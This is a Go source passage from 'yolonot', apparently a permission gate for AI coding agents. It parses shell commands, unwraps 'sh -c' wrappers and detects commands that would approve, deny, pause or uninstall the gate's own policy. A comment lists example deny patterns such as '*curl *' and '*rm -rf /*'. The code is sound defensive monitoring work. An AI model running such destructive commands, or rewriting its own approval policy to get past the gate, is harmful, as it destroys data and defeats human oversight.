	if idx := strings.IndexByte(pathPat, ' '); idx > 0 {
		pathPat = pathPat[:idx]
	} else if !strings.HasSuffix(pathPat, "*") {
		pathPat += "*"
	}
	prefixes := map[string]bool{"sudo": true, "env": true, "nice": true, "nohup": true, "time": true, "command": true, "exec": true}
	for _, seg := range splitSegments(fullCommand) {
		fields := strings.Fields(unquoteShellText(blankCodeQuotes(seg)))
		for len(fields) > 0 && (strings.Contains(fields[0], "=") || prefixes[filepath.Base(fields[0])]) {
			fields = fields[1:]
		}
		if len(fields) == 0 {
			continue
		}
		head := filepath.Base(fields[0])
		if head == "echo" || head == "printf" {
			continue
		}
		if strings.Contains(fields[0], "/") && glob.Match(pathPat, fields[0]) {
			return true
		}
		if isInterpreterWord(head) && len(fields) > 1 {
			arg := fields[1]
			if !strings.HasPrefix(arg, "-") && !strings.HasPrefix(arg, "+") && strings.Contains(arg, "/") && glob.Match(pathPat, arg) {
				return true
			}
		}
	}
	return false
}

// extractCmdWord gets the first literal word from a glob pattern.
// "*curl *" → "curl", "*rm -rf /*" → "rm", "cat *" → "cat"
func extractCmdWord(pattern string) string {
	s := strings.TrimLeft(pattern, "*")
	s = strings.TrimSpace(s)
	if idx := strings.IndexAny(s, " *"); idx > 0 {
		return s[:idx]
	}
	if s != "" {
		return s
	}
	return ""
}

// splitSegments splits a command by chain operators (|, ;, &&, ||)
// so each segment can be checked for its executable independently.
func splitSegments(command string) []string {
	// Simple split — replace chain operators with a separator then split
	s := command
	for _, op := range []string{"&&", "||"} {
		s = strings.ReplaceAll(s, op, "\x00")
	}
	for _, ch := range []byte{';', '|'} {
		s = strings.ReplaceAll(s, string(ch), "\x00")
	}
	var segments []string
	for _, seg := range strings.Split(s, "\x00") {
		seg = strings.TrimSpace(seg)
		if seg != "" {
			segments = append(segments, seg)
		}
	}
	if len(segments) == 0 {
		return []string{command}
	}
	return segments
}

func stripShellRedirects(tokens []string) []string {
	expanded := make([]string, 0, len(tokens))
	for _, tok := range tokens {
		expanded = append(expanded, splitAttachedRedirectToken(tok)...)
	}
	out := make([]string, 0, len(expanded))
	for i := 0; i < len(expanded); i++ {
		rest := strings.TrimLeft(expanded[i], "0123456789")
		if rest != "" && (rest[0] == '>' || rest[0] == '<' || strings.HasPrefix(rest, "&>")) {
			if strings.TrimLeft(rest, "><&|") == "" && i+1 < len(expanded) {
				i++
			}
			continue
		}
		out = append(out, expanded[i])
	}
	return out
}

func splitAttachedRedirectToken(tok string) []string {
	rest := strings.TrimLeft(tok, "0123456789")
	if rest == "" || rest[0] == '>' || rest[0] == '<' || strings.HasPrefix(rest, "&>") {
		return []string{tok}
	}
	inSingle, inDouble := false, false
	for i := 0; i < len(tok); i++ {
		c := tok[i]
		if c == '\'' && !inDouble {
			inSingle = !inSingle
		} else if c == '"' && !inSingle {
			inDouble = !inDouble
		} else if !inSingle && !inDouble && (c == '>' || c == '<') {
			cut := i
			if cut > 0 && tok[cut-1] == '&' {
				cut--
			}
			if cut > 0 {
				return append([]string{tok[:cut]}, splitAttachedRedirectToken(tok[cut:])...)
			}
		}
	}
	return []string{tok}
}

func selfPolicyCandidateArgv(command string) [][]string {
	return selfPolicyCandidateArgvDepth(command, 0)
}

func selfPolicyCandidateArgvDepth(command string, depth int) [][]string {
	if depth > 4 {
		return nil
	}
	var argvs [][]string
	shells := map[string]bool{"sh": true, "bash": true, "zsh": true, "dash": true, "ksh": true}
	for form := range rejectionForms(command) {
		if file, err := syntax.NewParser().Parse(strings.NewReader(form), ""); err == nil {
			syntax.Walk(file, func(node syntax.Node) bool {
				call, ok := node.(*syntax.CallExpr)
				if !ok || len(call.Args) == 0 {
					return true
				}
				var argv []string
				for _, w := range call.Args {
					if lit, _ := sensitiveWordText(w); lit != "" {
						argv = append(argv, lit)
					}
				}
				if len(argv) > 0 {
					argvs = append(argvs, argv)
					// Also unwrap sh/bash -c '<inner>' even when the outer call has redirects (e.g. 2>&1)
					head := filepath.Base(argv[0])
					if shells[head] {
						for i := 1; i < len(argv)-1; i++ {
							if argv[i] == "-c" || (strings.HasPrefix(argv[i], "-") && !strings.HasPrefix(argv[i], "--") && strings.HasSuffix(argv[i], "c")) {
								argvs = append(argvs, selfPolicyCandidateArgvDepth(argv[i+1], depth+1)...)
								break
							}
						}
					}
				}
				return true
			})
		}
		for _, seg := range splitSegments(form) {
			for inner := range rejectionForms(seg) {
				if f := stripShellRedirects(strings.Fields(inner)); len(f) > 0 {
					argvs = append(argvs, f)
				}
			}
		}
	}
	return argvs
}

// selfPolicyVerb returns the yolonot verb when command, or a shell-wrapped
// form of it, runs one that writes approvals, denials, or policy. Global
// flags may sit before the verb.
func selfPolicyVerb(command string) string {
	always := map[string]bool{"approve": true, "deny": true, "reset": true, "pause": true, "resume": true, "uninstall": true, "mod": true}
	withArgs := map[string]bool{"profile": true, "judges": true, "judge": true, "models": true, "model": true, "config": true}
	readOnly := map[string]bool{"list": true, "ls": true, "show": true, "status": true}
	wrappers := map[string]bool{"sudo": true, "env": true, "command": true, "exec": true, "nohup": true, "nice": true, "time": true}
	best := ""
	for _, f := range selfPolicyCandidateArgv(command) {
		for len(f) > 0 {
			head := filepath.Base(strings.Trim(f[0], `"'`))
			if strings.Contains(f[0], "=") {
				f = f[1:]
				continue
			}
			if wrappers[head] {
				f = f[1:]
				for len(f) > 0 && (strings.HasPrefix(f[0], "-") || strings.Contains(f[0], "=")) {
					flag := f[0]
					f = f[1:]
					if flag == "--" {
						break
					}
				}
				continue
			}
			break
		}
		if len(f) == 0 || filepath.Base(strings.Trim(f[0], `"'`)) != "yolonot" {
			continue
		}
		var words []string
		hasGlobal := false
		for _, w := range stripShellRedirects(f[1:]) {
			if w == "--global" || w == "-g" {
				hasGlobal = true
			}
			if !strings.HasPrefix(w, "-") {
				words = append(words, w)
			}
		}
		if len(words) == 0 {
			continue
		}
		verb := words[0]
		if (verb == "pause" || verb == "resume") && hasGlobal {
			return verb + " --global"
		}
		if always[verb] {
			if best == "" {
				best = verb
			}
			continue
		}
		if !withArgs[verb] || len(words) <= 1 || readOnly[words[1]] {
			continue
		}
		if verb == "config" && words[1] == "quiet" && len(words) == 2 {
			continue
		}
		if (verb == "judges" || verb == "judge") && (words[1] == "escalation" || words[1] == "esc") && (len(words) == 2 || words[2] == "test") {
			continue
		}
		if verb == "profile" && len(words) == 2 && GetHarness(words[1]) != nil {
			continue
		}
		if best == "" {
			best = verb
		}
	}
	return best
}

// extractExecutables returns the command names from a command string,
// handling prefixes like sudo, env, and paths.
func extractExecutables(command string) []string {
	var exes []string
	prefixes := map[string]bool{"sudo": true, "env": true, "nice": true, "nohup": true, "time": true}

	// Only look at the first few tokens — stop at arguments
	tokens := strings.Fields(command)
	for i, tok := range tokens {
		// Stop at flags, quotes, or too many tokens
		if i > 3 || strings.HasPrefix(tok, "-") || strings.HasPrefix(tok, "\"") || strings.HasPrefix(tok, "'") {
			break
		}
		// Strip path
		base := tok
		if idx := strings.LastIndex(base, "/"); idx >= 0 {
			base = base[idx+1:]
		}
		exes = append(exes, base)
		// Stop after first non-prefix command
		if !prefixes[base] {
			break
		}
	}
	return exes
}
